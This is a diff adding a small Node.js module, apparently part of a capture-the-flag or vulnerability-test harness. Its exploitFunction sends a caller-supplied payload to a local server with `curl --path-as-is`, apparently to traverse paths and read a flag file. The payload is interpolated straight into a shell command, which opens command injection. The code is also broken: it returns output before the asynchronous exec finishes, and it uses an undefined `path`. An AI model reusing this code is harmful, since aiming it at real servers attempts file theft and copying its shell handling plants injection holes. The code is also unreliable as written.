@@ -1,0 +1,18 @@
+function exploitFunction(payload) {
+  const pathToFlag = path.resolve(__dirname, "../flag.html");
+  const attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
+
+  let { exec } = require("child_process");
+  let output = "";
+  exec(attack_string, (error, stdout) => {
+    if (error) {
+      console.error(`Error executing command: ${error}`);
+      return;
+    }
+    output = stdout;
+  });
+
+  return output; // Return the output for verification
+}
+
+module.exports = { exploitFunction };
